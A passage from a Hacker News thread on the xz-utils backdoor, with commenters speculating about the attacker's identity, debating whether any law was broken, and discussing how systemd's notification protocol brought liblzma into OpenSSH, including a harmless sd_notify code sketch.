ago](item?id=39869222)   | [root](#39866482) | [parent](#39868770) | [next](#39869018) [–]  For some groups they certainly are. However at this point: every developed nation has a professional offensive security group that have varying degrees of potency. All are more resourced than 99.9% of organizations defending and enjoy legal autonomy in their country and allied countries for their work. If you're getting salaried comfortably, and you have near infinite resources, a two year timeline is trivial. As an American, I always like to point to things we know our own services have done first[0]. Each actor group have their own motivations and tactics[1]. As someone who spent a lot of time dealing with a few state actors, you learn your adversaries tricks of the trade and they are patient for the long-con because they can afford to be. [0] - [https://www.npr.org/2020/03/05/812499752/uncovering-the-cias...](https://www.npr.org/2020/03/05/812499752/uncovering-the-cias-audacious-operation-that-gave-them-access-to-state-secrets) [1] - [https://learn.microsoft.com/en-us/microsoft-365/security/def...](https://learn.microsoft.com/en-us/microsoft-365/security/defender/microsoft-threat-actor-naming?view=o365-worldwide) | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39869018)   | [root](#39866482) | [parent](#39868770) | [prev](#39869222) | [next](#39869933) [–]  I think you are confusing non-state e.g. ransomware groups, which are usually not part of a government (although some exceptions like North Korea likely exist) with state-sponsored hackers who are often directly working under military command. Soldiers are not "dicks on the internet". | | --- | --- | --- | | | |  |  | [willdr](user?id=willdr) [9 months ago](item?id=39869418)   | [root](#39866482) | [parent](#39869018) | [next](#39869933) [–]  As someone who has been in a fair few discord chats with soldiers, I'd beg to differ... | | --- | --- | --- | | | |  |  | [sonicanatidae](user?id=sonicanatidae) [9 months ago](item?id=39898446)   | [root](#39866482) | [parent](#39869418) | [next](#39869933) [–]  >As someone who has been in a fair few discord chats with soldiers, I'd beg to differ... As someone that's spent a lot of time in darker places, I would agree. | | --- | --- | --- | | | |  |  | [stephc\_int13](user?id=stephc_int13) [9 months ago](item?id=39869933)   | [root](#39866482) | [parent](#39868770) | [prev](#39869018) | [next](#39869985) [–]  This is not that costly. Growing bonsai trees also takes a lot of patience, decades, but you don't have to grow only one at a time, the pros are growing them in large numbers, with minimal work on each individual trees once in a while. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [9 months ago](item?id=39869985)   | [root](#39866482) | [parent](#39868770) | [prev](#39869933) | [next](#39868442) [–]  There is a survivorship bias problem there; what if the stupid criminals are the only ones which you *notice*? | | --- | --- | --- | | | |  |  | [IncreasePosts](user?id=IncreasePosts) [9 months ago](item?id=39868442)   | [root](#39866482) | [parent](#39868270) | [prev](#39868598) | [next](#39869364) [–]  It might not even be a long time. He might have just been approached exactly because of his history to insert the back door. And offered either money, or blackmailed or threatened | | --- | --- | --- | | | |  |  | [hangonhn](user?id=hangonhn) [9 months ago](item?id=39868531)   | [root](#39866482) | [parent](#39868442) | [next](#39870080) [–]  Oh man. The was a scenario that didn't cross my mind. I was too narrowly focused on the technical aspects rather than the social aspects of security. Great point. | | --- | --- | --- | | | |  |  | [Arrath](user?id=Arrath) [9 months ago](item?id=39870080)   | [root](#39866482) | [parent](#39868442) | [prev](#39868531) | [next](#39869364) [–]  What if this contributor was a member of a state actor/persistent threat group and, like some totally legit software dev houses, they encourage their people to contribute to OSS projects for the whole personal pursuit/enjoyment/fulfillment angle? With the added bonus that sometimes they get to pull off a longcon like this. | | --- | --- | --- | | | |  |  | [fmajid](user?id=fmajid) [9 months ago](item?id=39869364)   | [root](#39866482) | [parent](#39867884) | [prev](#39868270) | [next](#39868105) [–]  2 years of one engineer's time is very cheap, compared to e.g. the NSA's CryptoAG scam. I'd say most likely a Chinese intelligence plant, *kindly* offering to relieve the burden of the original author of xz. | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39869440)   | [root](#39866482) | [parent](#39869364) | [next](#39868105) [–]  I got the same idea. On XZ dev mailing list there were a few discussions about "is there a maintainer?" 2-3 years ago. It's not hard to find these types discussions and then dedicate a few years of effort to start "helping out" and eventually be the one signing releases for the project. That's peanuts for a state actor. | | --- | --- | --- | | | |  |  | [throwaway384638](user?id=throwaway384638) [9 months ago](item?id=39869967)   | [root](#39866482) | [parent](#39869440) | [next](#39868105) [–]  This right here. This is exactly what I would be doing - find small broke maintainers offer them a few hundred grand - with a target in mind. | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39868105)   | [root](#39866482) | [parent](#39867884) | [prev](#39869364) | [next](#39869114) [–]  This is most likely not his first backdoor, but the first which was detected. So most likely he didn't wait two years to benefit. | | --- | --- | --- | | | |  |  | [ranger\_danger](user?id=ranger_danger) [9 months ago](item?id=39869114)   | [root](#39866482) | [parent](#39867884) | [prev](#39868105) | [next](#39869104) [–]  > It's also very possible that the account was compromised and taken over Or they WERE legit and simply went rogue, perhaps due to external factors. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869104)   | [root](#39866482) | [parent](#39867884) | [prev](#39869114) | [next](#39867493) [–]  I am thinking more in so-called rubberhose cryptoanalysis. <https://xkcd.com/538/> | | --- | --- | --- | | | |  |  | [rrix2](user?id=rrix2) [9 months ago](item?id=39867493)   | [root](#39866482) | [parent](#39866716) | [prev](#39867884) | [next](#39866802) [–]  That was a review of someone else's work? <https://github.com/tukaani-project/xz/pull/86> | | --- | --- | --- | | | |  |  | [Fnoord](user?id=Fnoord) [9 months ago](item?id=39875977)   | [root](#39866482) | [parent](#39867493) | [next](#39866802) [–]  Since that repo is disabled: here is a mirror of the discussion [1] [1] <https://archive.is/tksCR> | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39866802)   | [root](#39866482) | [parent](#39866716) | [prev](#39867493) | [next](#39869047) [–]  Yeah I saw that - I wouldn't bet on them being in the US but who knows. Maybe they just really love CRC32 ;) And introducing backdoors (if it that was them not an account takeover). | | --- | --- | --- | | | |  |  | [kevin\_b\_er](user?id=kevin_b_er) [9 months ago](item?id=39867233)   | [root](#39866482) | [parent](#39866802) | [next](#39869047) [–]  Those tarballs are PGP signed, too.. | | --- | --- | --- | | | |  |  | [dreamingincode](user?id=dreamingincode) [9 months ago](item?id=39869047)   | [root](#39866482) | [parent](#39866716) | [prev](#39866802) | [next](#39867996) [–]  The full name "Jia Cheong Tan" doesn't sound like Mainland China. The name and actions could be intentionally misleading though. <https://news.ycombinator.com/item?id=39867737> | | --- | --- | --- | | | |  |  | [viraptor](user?id=viraptor) [9 months ago](item?id=39869344)   | [root](#39866482) | [parent](#39869047) | [next](#39869513) [–]  We're way too global now for this to be more than a tiny extra signal. People move around, families preserve names. Also nobody checked that person's id, so "Jia" is only slightly more meaningful than "ghrssbitrvii". | | --- | --- | --- | | | |  |  | [graemep](user?id=graemep) [9 months ago](item?id=39869513)   | [root](#39866482) | [parent](#39869047) | [prev](#39869344) | [next](#39893086) [–]  Names can be faked, and even real names are not a great indicator. Unless you have some very specific cultural knowledge you could not make even vaguely useful deductions about my location, nationality, culture, ethnicity etc. from my name. I get a lot of wrong guesses though! | | --- | --- | --- | | | |  |  | [rurban](user?id=rurban) [9 months ago](item?id=39893086)   | [root](#39866482) | [parent](#39869047) | [prev](#39869513) | [next](#39867996) [–]  Since his only appearance outside of github and git repos is on some Taiwanese blogs, can we please change all occurances of China to Taiwan please? And some others hints at Eastern Europe, comparing the timezones. Taiwan ist still the strongest hint though. | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39867996)   | [root](#39866482) | [parent](#39866530) | [prev](#39866716) | [next](#39868381) [–]  From their Git commits, they're in China's time zone. | | --- | --- | --- | | | |  |  | [supposemaybe](user?id=supposemaybe) [9 months ago](item?id=39869935)   | [root](#39866482) | [parent](#39867996) | [next](#39870953) [–]  Remember that agencies like NSA, GCHQ etc will always use false flags in their code, even when it doesn’t have as high risk of exposure as a backdoor in public has. Looking at the times of commits shouldn’t be given much value at all. A pretty pointless endeavour. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39872907)   | [root](#39866482) | [parent](#39869935) | [next](#39870953) [–]  State actors are actually known for not doing that; after all, there's no need to hide when what you're doing is legal. They also tend to work 9-5 in their own timezones. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39930677)   | [root](#39866482) | [parent](#39872907) | [next](#39870953) [–]  It might be legal but would (or at least should) be seen as an attack by all other countries using the software, even allies, and in a saner world wouldl receive a strong political response. | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39870953)   | [root](#39866482) | [parent](#39867996) | [prev](#39869935) | [next](#39869447) [–]  But the actual interactions with Github are done between 12.00 UTC and 18.00 UTC <https://news.ycombinator.com/item?id=39870925> [https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91c...](https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91cihjcmVhdGVkX2F0KSBBUyBob3VyLCBjb3VudCgqKSBGUk9NIGdpdGh1Yl9ldmVudHMgV0hFUkUgYWN0b3JfbG9naW49J0ppYVQ3NScgR1JPVVAgQlkgaG91ciBPUkRFUiBCWSBob3Vy) | | --- | --- | --- | | | |  |  | [zone411](user?id=zone411) [9 months ago](item?id=39871681)   | [root](#39866482) | [parent](#39870953) | [next](#39869447) [–]  But note this: [https://twitter.com/birchb0y/status/1773871381890924872/phot...](https://twitter.com/birchb0y/status/1773871381890924872/photo/1) | | --- | --- | --- | | | |  |  | [berdario](user?id=berdario) [9 months ago](item?id=39873473)   | [root](#39866482) | [parent](#39871681) | [next](#39869447) [–]  Interesting! As some of the Tweet replies mentioned, they shipped releases that contained the backdoor, and committed other questionable changes at the "usual" times. For sure we're almost certainly not dealing with a compromised workstation, so I don't think that would explain the different times for the worst offending changes. Maybe he has some technical experts/handlers/managers that had to oversee when they introduced the actual malicious changes, and thus this reflects when he got the go-ahead signal from these other people (and thus that reflects their working hours?) Or maybe they were just travelling at that time? (maybe travelling to visit the aforementioned handlers? Or travel to visit family... even criminals have a mom and dad) Also, keep in mind that my Clickhouse query includes all of the Github interactions (for example, timestamp of issue comments)... and unlike a Git commit timestamp, it's hard to fake those (because you'd need to schedule the posting of such comments, probably via the API. Not impossible, but easier to think that JiaT75 just used the Gitub UI to write comments), the Tweet mentions just "commit history" Usually the simpler explanation has less chance of being wrong... thinking of some possibilities: - Chinese/Taiwanese state actor, who employs people 9-5 (but somehow, their guy worked 20.00 - 02.00 local time) - Chinese/Taiwanese rogue group/lone wolf... moonlighting on this exploit after their day job (given that to interact with Lasse they'd be forced to work late, this is not outside of the realm of possibilities) - Non-Chinese state actor, employing someone 9-5 (consistent with most of the Github interactions), wanting to pin responsibility on China/Taiwan (+0800 timezone for commits), which for some unexplained reason pushed the worst offending changes at really weird times. - Chinese/Taiwanese state actor, that wanted to pin the blame on western state actors (by making all of the changes at times compatible with someone working in Europe), and somehow they slipped up when pushing the worst offending changes. - Chinese/Taiwanese state actor, employing someone in Europe (if they need to get approval of changes/gain the trust of the previous maintainer Lasse, it might make sense to have better/more timezone overlap)... which for some weird (yet "innocent") reason, kept the device that they worked on, configured with a +0800 timezone - Non-Chinese state actor, pretending to be a Chinese entity that wanted to pin the blame on a western entity and slip up by making the worst offending changes at 3am (i.e. it was not a slip up, but it's part of the misdirection efforts.) Some of these hypotheses are a bit farfetched, but reality is stranger than fiction | | --- | --- | --- | | | |  |  | [jcgrillo](user?id=jcgrillo) [9 months ago](item?id=39869447)   | [root](#39866482) | [parent](#39867996) | [prev](#39870953) | [next](#39869757) [–]  My git commits are sometimes in UTC, depending on which computer I make them from. Sometimes my laptop just switches timezones depending on whether I'm using wifi or LTE. I wouldn't put much weight on the timezone. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869757)   | [root](#39866482) | [parent](#39867996) | [prev](#39869447) | [next](#39869107) [–]  The time stamp of a git commit depends on the system clock of the computer the commit was checked in. This cannot be checked by github & co (except that they could reject commits which have time stamps in the future). | | --- | --- | --- | | | |  |  | [stephenr](user?id=stephenr) [9 months ago](item?id=39869107)   | [root](#39866482) | [parent](#39867996) | [prev](#39869757) | [next](#39868381) [–]  I assume you mean UTC+8... that covers about 20% of the earth's population, besides China it includes parts of Russia, a bunch of SEA and Western Australia. | | --- | --- | --- | | | |  |  | [fmajid](user?id=fmajid) [9 months ago](item?id=39869374)   | [root](#39866482) | [parent](#39869107) | [next](#39868381) [–]  China *is* 20& of the world's population... | | --- | --- | --- | | | |  |  | [rubymamis](user?id=rubymamis) [9 months ago](item?id=39868381)   | [root](#39866482) | [parent](#39866530) | [prev](#39867996) | [next](#39868722) [–]  We shouldn't rule out the probability that this account is from a U.S. agency as well. | | --- | --- | --- | | | |  |  | [EthanHeilman](user?id=EthanHeilman) [9 months ago](item?id=39869747)   | [root](#39866482) | [parent](#39868381) | [next](#39868959) [–]  We shouldn't rule it out, but it seems unlikely to me. This is more reckless than any backdoor I can think of by a US agency . NSA backdoored Dual EC DRBG, which was extremely reckless, but this makes that look careful and that was the Zenith of NSA recklessness. The attackers here straight up just cowboy'd the joint. I can't think of any instance in which US intelligence used sock puppets on public forums and mailinglists to encourage deployment of the backdoored software and I maintain a list of NSA backdoors: <https://www.ethanheilman.com/x/12/index.html> It just doesn't seem like their style. | | --- | --- | --- | | | |  |  | [oceanplexian](user?id=oceanplexian) [9 months ago](item?id=39870014)   | [root](#39866482) | [parent](#39869747) | [next](#39868959) [–]  The CIA had plans to commit terrorist acts against American civilians to start a war against Cuba in the 60s. This is quite literally their style. For example, perhaps they were planning to blame the hack of a power plant or critical infrastructure on this exploit, then use the "evidence" that was leaked to prove it was China, and from there carry out an offensive operation against Chinese infrastructure. There are lots of subversive reasons they would want to do this. | | --- | --- | --- | | | |  |  | [EthanHeilman](user?id=EthanHeilman) [9 months ago](item?id=39879367)   | [root](#39866482) | [parent](#39870014) | [next](#39872914) [–]  You are referring to Operation Northwoods [0], a set of plans from the 1960s, all of which were rejected. Operation Northwoods came about because Brig. Gen. Edward Lansdale, asked the CIA to come up with a list of pretexts that might be used to justify an invasion of Cuba. This request had a number of planners at the CIA enumerate possible false flags that could be used as a pretext. One of those plans was a terror attack against US citizens. Operation Northwoods was rejected and never implemented. The US has plans for nearly everything, but there is a massive difference between a plan that some CIA analyst is pitching and something the US is likely or even able to do. The US had all sorts of plans for how to handle a pandemic, but then when one actually happened, the plans couldn't be implemented because the US didn't actually have the capabilities the plans called for. > example, perhaps they were planning to blame the hack of a power plant or critical infrastructure on this exploit, then use the "evidence" that was leaked to prove it was China, and from there carry out an offensive operation against Chinese infrastructure. Backdooring OpenSSH would in no way function as a pretext for attacks on Chinese infrastructure. No one outside the tech companies cares about this. The US also doesn't need to invent hacking pretexts, you could just point to one of many exposed Chinese hacking incidents. [0] : <https://en.wikipedia.org/wiki/Operation_Northwoods> | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39872914)   | [root](#39866482) | [parent](#39870014) | [prev](#39879367) | [next](#39868959) [–]  The CIA in 2024 really doesn't have any continuity with itself in 1960. Things like the Church Commission changed how it was governed. | | --- | --- | --- | | | |  |  | [wannacboatmovie](user?id=wannacboatmovie) [9 months ago](item?id=39868959)   | [root](#39866482) | [parent](#39868381) | [prev](#39869747) | [next](#39868722) [–]  Just so I understand, you're alleging that a U.S. agency was, among other things, submitting patches for a mainland Chinese home-grown CPU architecture (Loongson)? | | --- | --- | --- | | | |  |  | [boutique](user?id=boutique) [9 months ago](item?id=39869059)   | [root](#39866482) | [parent](#39868959) | [next](#39869054) [–]  No, they're not. They are saying that due to the extraordinary circumstances with this case US agencies cannot be excluded from suspicion. At this time no actor seems to be a more likely perpetrator than the next. (Keep in mind that false-flag operations are a very common occurrence in cyber warfare and this cannot be ruled out yet.) | | --- | --- | --- | | | |  |  | [yorwba](user?id=yorwba) [9 months ago](item?id=39869054)   | [root](#39866482) | [parent](#39868959) | [prev](#39869059) | [next](#39869520) [–]  Aren't you confusing JiaT75 and xry111? And if someone wanted to attack a target running on Loongson, they would certainly have to make sure the code can actually run there in the first place. | | --- | --- | --- | | | |  |  | [FLT8](user?id=FLT8) [9 months ago](item?id=39869520)   | [root](#39866482) | [parent](#39868959) | [prev](#39869054) | [next](#39868722) [–]  It doesn't seem out of the question that the U.S. or allied nations might want to be involved in the development effort around these CPUs. Even if initially it's just to build some credibility for this account so future adversarial patches are accepted with less suspicion? If you think that's implausible, I'm interested why? | | --- | --- | --- | | | |  |  | [offmycloud](user?id=offmycloud) [9 months ago](item?id=39868722)   | [root](#39866482) | [parent](#39866530) | [prev](#39868381) | [next](#39869913) [–]  CISA Advisory: [https://www.cisa.gov/news-events/alerts/2024/03/29/reported-...](https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094) Note that it say "Fedora 41" in the CISA page link to Red Hat, but Red Hat changed the blog title to "Fedora 40" and left the HTML page title as "Fedora 41". | | --- | --- | --- | | | |  |  | [oceanplexian](user?id=oceanplexian) [9 months ago](item?id=39869913)   | [root](#39866482) | [parent](#39866530) | [prev](#39868722) | [next](#39869633) [–]  A federal investigation into what, itself? The primary actors doing this type of thing are the US Government. | | --- | --- | --- | | | |  |  | [weinberg](user?id=weinberg) [9 months ago](item?id=39869633)   | [root](#39866482) | [parent](#39866530) | [prev](#39869913) | [next](#39867619) [–]  And I bet if it ended up on a NATO system, things escalate quickly for the person / nation states being scrutinized (<https://www.nato.int/cps/en/natohq/topics_78170.htm>) | | --- | --- | --- | | | |  |  | [sneak](user?id=sneak) [9 months ago](item?id=39867619)   | [root](#39866482) | [parent](#39866530) | [prev](#39869633) | [next](#39869230) [–]  What law do you think is being broken here? | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [9 months ago](item?id=39867767)   | [root](#39866482) | [parent](#39867619) | [next](#39869230) [–]  Maybe <https://www.law.cornell.edu/uscode/text/18/1030#a_5> ? > knowingly causes the transmission of a program, information, code, or command, and as a result of such conduct, intentionally causes damage without authorization, to a protected computer; | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39868728)   | [root](#39866482) | [parent](#39867767) | [next](#39869230) [–]  How does posting an exploit POC differ here? | | --- | --- | --- | | | |  |  | [schlauerfox](user?id=schlauerfox) [9 months ago](item?id=39868859)   | [root](#39866482) | [parent](#39868728) | [next](#39869230) [–]  Intent. It's a big part of law and prosecution. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39869060)   | [root](#39866482) | [parent](#39868859) | [next](#39869230) [–]  No, freedom of speech (as far as I know) protects even exploit code. The statutes being linked would cover *using* the backdoor to gain unauthorized entry to a system. I think the question of whether anything illegal has occurred from the public facts is unclear, at least to me, and interesting. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39869082)   | [root](#39866482) | [parent](#39869060) | [next](#39869492) [–]  I see a dev on the project has just posted that it has been seen in the wild, so I guess you'd have standing there. [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) | | --- | --- | --- | | | |  |  | [wtallis](user?id=wtallis) [9 months ago](item?id=39869492)   | [root](#39866482) | [parent](#39869060) | [prev](#39869082) | [next](#39869230) [–]  The first amendment might overrule the cited law if that law didn't already include a requirement for intentional harm. But since the law *does* already have that requirement, there's not really an opportunity for a freedom of speech justification to be what protects a non-malicious publication of a proof of concept. The law isn't trying to infringe on freedom of speech. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39882422)   | [root](#39866482) | [parent](#39869492) | [next](#39869230) [–]  But my argument isn't that freedom of speech could be used as an excuse for something that would otherwise be illegal -- my argument is that publishing and discussing exploit code is a *constitutionally-protected activity*. The CFAA statutes can be violated by gaining unauthorized access to a protected computer system, but that did not happen in the process of authoring and publishing the exploit code. The attacker was authorized to release new versions of the software, and they did. Their choice of what to make their software actually do is not regulated by the government, any more than a musician's choice of which lyrics to include in their song. If an attacker then *actually uses* the backdoor created by someone else's decision to deploy the new release into their own environment, to gain unauthorized access to a protected computer system, then obviously there's a CFAA violation there. The public facts don't contain documented examples of this having happened (yet), though it will be unsurprising if that changes. So it is still not obvious, at least to me, that any crime under US law has occurred so far. I am not a lawyer, though I'm aware of how badly the government has lost the previous court cases that attempted to restrict what humans can put in source code. | | --- | --- | --- | | | |  |  | [progbits](user?id=progbits) [9 months ago](item?id=39869230)   | [parent](#39866482) | [prev](#39866530) | [next](#39938093) [–]  > Getting punched in the face is actually a necessary human condition for a healthy civilization. Aside from signed commits, we need to bring back GPG key parties and web of trust. When using a project you would know how many punches away from the committers you are. | | --- | --- | --- | | | |  |  | [woodruffw](user?id=woodruffw) [9 months ago](item?id=39869451)   | [root](#39866482) | [parent](#39869230) | [next](#39869638) [–]  PGP is more famous for "web of trust" topologies, not chains of trust. For all of their nerd cred, key parties didn't accomplish very much (as evidenced by the fact that nothing on the Internet really broke when the WoT imploded a few years ago[1]). The "real" solution here is mostly cultural: treating third-party software like the risky thing it actually is, rather than a free source of pre-screened labor. [1]: <https://inversegravity.net/2019/web-of-trust-dead/> | | --- | --- | --- | | | |  |  | [weinzierl](user?id=weinzierl) [9 months ago](item?id=39869661)   | [root](#39866482) | [parent](#39869451) | [next](#39869475) [–]  Yes, but there was also little pressure to really build the WOT. People, like myself, did it because it was fun, but no one really relied on it. This *could* change, but it is still far from certain if it'd work given enough pressure. | | --- | --- | --- | | | |  |  | [progbits](user?id=progbits) [9 months ago](item?id=39869475)   | [root](#39866482) | [parent](#39869451) | [prev](#39869661) | [next](#39869638) [–]  Chain/web was typo, corrected, thanks. I know of the key party issues. But there is some value to knowing how far removed from me and people I trust the project authors are. | | --- | --- | --- | | | |  |  | [woodruffw](user?id=woodruffw) [9 months ago](item?id=39869621)   | [root](#39866482) | [parent](#39869475) | [next](#39870093) [–]  > But there is some value to knowing how far removed from me and people I trust the project authors are That's true! | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39870093)   | [root](#39866482) | [parent](#39869475) | [prev](#39869621) | [next](#39869638) [–]  Nowadays i achieve this with linkedin[1] connections. Less nerd cred, but achieves roughly the same purpose (most of the people I care about in my niche are at most a 3rd degree connection - a friend of a friend of a friend). [1] formerly also twitter, at least partially. | | --- | --- | --- | | | |  |  | [EthanHeilman](user?id=EthanHeilman) [9 months ago](item?id=39869638)   | [root](#39866482) | [parent](#39869230) | [prev](#39869451) | [next](#39938093) [–]  The web of punches? | | --- | --- | --- | | | |  |  | [throw10920](user?id=throw10920) [9 months ago](item?id=39938093)   | [parent](#39866482) | [prev](#39869230) | [next](#39866076) [–]  > Getting punched in the face is actually a necessary human condition for a healthy civilization. This is factually false - in fact, it's literally the direct opposite of the truth. "Getting punched in the face" is base violence that is incompatible with a healthy civilization. A good government with a robust justice system is what is *actually* needed for a healthy civilization. | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [9 months ago](item?id=39866076)   | [prev](#39866482) | [next](#39871496) [–]  > openssh does not directly use liblzma. However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma. The systemd notification protocol could have been as simple as just writing a newline to a pipe, but instead you have to link to the libsystemd C library, so now security-critical daemons like openssh have additional dependencies like liblzma loaded into their address space (even if you don't use systemd as PID 1), increasing the risks of supply chain attacks. Thanks, systemd. | | --- | --- | --- | | | |  |  | [Jasper\_](user?id=Jasper_) [9 months ago](item?id=39866254)   | [parent](#39866076) | [next](#39866194) [–]  That is all the protocol is. From [https://www.freedesktop.org/software/systemd/man/latest/sd\_n...](https://www.freedesktop.org/software/systemd/man/latest/sd_notify.html): > These functions send a single datagram with the state string as payload to the socket referenced in the $NOTIFY\_SOCKET environment variable. The simplest implementation (pseudocode, no error handling, not guaranteed to compile), is something like: ```     const char *addrstr = getenv("NOTIFY_SOCKET");     if (addrstr) {         int fd = socket(AF_UNIX, SOCK_DGRAM, 0);         struct sockaddr_un addr = { .sun_family = AF_UNIX };         strncpy(addr.sun_path, sizeof(addr.sun_path), addrstr);         connect(fd, (struct sockaddr*) &addr);         write(fd, "READY=1");         close(fd);     } ``` | | --- | --- | --- | | | |  |  | [iforgotpassword](user?id=iforgotpassword) [9 months ago](item?id=39867621)   | [root](#39866076) | [parent](#39866254) | [next](#39867092) [–]  This is what I did for a daemon I'm maintaining. Type=notify support was requested but I'm really allergic to adding new libs to a project until they really do some heavy lifting and add enough value. I was pleasantly surprised the protocol was that simple and implemented it myself. I think systemd should just provide a simple standalone reference implementation and encourage people to copy it into their project directly. (But maybe they already do, I did that almost a decade ago IIRC when the feature was relatively new.) | | --- | --- | --- | | | |  |  | [throwaway71271](user?id=throwaway71271) [9 months ago](item?id=39867092)   | [root](#39866076) | [parent](#39866254) | [prev](#39867621) | [next](#39871284) [–]  goddamnit leftpad got us too :) | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871284)   | [root](#39866076) | [parent](#39866254) | [prev](#39867092) | [next](#39866194) [–]  Whoops, you forgot `vsock:`, `@`, `SO\_PASSCRED` (I think)... oh and where is that example provided? But yep that's all the protocol is for sure (and forever)! | | --- | --- | --- | | | |  |  | [delroth](user?id=delroth) [9 months ago](item?id=39866194)   | [parent](#39866076) | [prev](#39866254) | [next](#39866190) [–]  > The systemd notification protocol could have been as simple as just writing a newline to a pipe It basically is. libsystemd links to liblzma for other features not related to notifications. (The protocol is that systemd passes the path to a unix socket in the `NOTIFY\_SOCKET` env variable, and the daemon writes "READY=1" into it.) | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [9 months ago](item?id=39866243)   | [root](#39866076) | [parent](#39866194) | [next](#39869063) [–]  Is that protocol documented/stable? For whatever reason, daemons are choosing to link to libsystemd instead of implementing it themselves. It doesn't matter that libsystemd links to liblzma for other reasons. It's still in the address space of any daemon that is using libsystemd for the notification protocol. | | --- | --- | --- | | | |  |  | [wickberg](user?id=wickberg) [9 months ago](item?id=39866314)   | [root](#39866076) | [parent](#39866243) | [next](#39869063) [–]  I know Golang has their own implementation of sd\_notify(). For Slurm, I looked at what a PITA pulling libsystemd into our autoconf tooling would be, stumbled on the Golang implementation, and realized it's trivial to implement directly. | | --- | --- | --- | | | |  |  | [tripflag](user?id=tripflag) [9 months ago](item?id=39866885)   | [root](#39866076) | [parent](#39866314) | [next](#39870523) [–]  indeed; it should be trivial in any language. Here's python: [https://github.com/9001/copyparty/blob/a080759a03ef5c0a6b06c...](https://github.com/9001/copyparty/blob/a080759a03ef5c0a6b06c697f37ae4e00812739f/copyparty/svchub.py#L1019-L1038) | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39867841)   | [root](#39866076) | [parent](#39866885) | [next](#39870523) [–]  It should be trivial in any language *which has AF\_UNIX*. Last time I looked, Java didn't have it, so the only way was to call into non-Java code. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39868510)   | [root](#39866076) | [parent](#39867841) | [next](#39868145) [–]  At first I thought that this surely could not be true as of today, but it looks like it is. There is AF\_UNIX support, but only for streams and not datagrams: <https://bugs.openjdk.org/browse/JDK-8297837> What an odd decision. I suppose that you could execute systemd-notify but that's a solution that I would not like. | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39869331)   | [root](#39866076) | [parent](#39868510) | [next](#39868609) [–]  It looks like the FFI (Project Panama) finally landed in Java 22, released a few days ago: <https://openjdk.org/jeps/454> Unless that feature also has some weird limitation, you could probably use that to call the socket API in libc. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39868609)   | [root](#39866076) | [parent](#39868510) | [prev](#39869331) | [next](#39868145) [–]  > I suppose that you could execute systemd-notify but that's a solution that I would not like. What I did was to use JNA to call sd\_notify() in libsystemd.so.0 (when that library exists), which works but obviously does not avoid using libsystemd. I suppose I could have done all the socket calls into glibc by hand, but doing that single call into libsystemd directly was simpler (and it can be expected to exist whenever systemd is being used). | | --- | --- | --- | | | |  |  | [reftel](user?id=reftel) [9 months ago](item?id=39868145)   | [root](#39866076) | [parent](#39867841) | [prev](#39868510) | [next](#39870523) [–]  Then I suggest you have another look =) [https://inside.java/2021/02/03/jep380-unix-domain-sockets-ch...](https://inside.java/2021/02/03/jep380-unix-domain-sockets-channels/) | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39868514)   | [root](#39866076) | [parent](#39868145) | [next](#39870523) [–]  Under Limitations: Datagram support | | --- | --- | --- | | | |  |  | [reftel](user?id=reftel) [9 months ago](item?id=39869087)   | [root](#39866076) | [parent](#39868514) | [next](#39870523) [–]  It appears you are correct. What an odd limitation! | | --- | --- | --- | | | |  |  | [KerrAvon](user?id=KerrAvon) [9 months ago](item?id=39870523)   | [root](#39866076) | [parent](#39866314) | [prev](#39866885) | [next](#39867692) [–]  Caveat is that golang is not a good enough actor to be a reliable indicator of whether this interface is supported, though. They’ll go to the metal because they can, not because it’s stable. | | --- | --- | --- | | | |  |  | [pkaye](user?id=pkaye) [9 months ago](item?id=39867692)   | [root](#39866076) | [parent](#39866314) | [prev](#39870523) | [next](#39869063) [–]  Can me point me to the Golang implementation? Is it a standard package? | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39867972)   | [root](#39866076) | [parent](#39867692) | [next](#39869063) [–]  Most likely <https://github.com/coreos/go-systemd> | | --- | --- | --- | | | |  |  | [wiml](user?id=wiml) [9 months ago](item?id=39869063)   | [root](#39866076) | [parent](#39866194) | [prev](#39866243) | [next](#39883862) [–]  > libsystemd links to liblzma for other features not related to notifications Which is pretty emblematic of 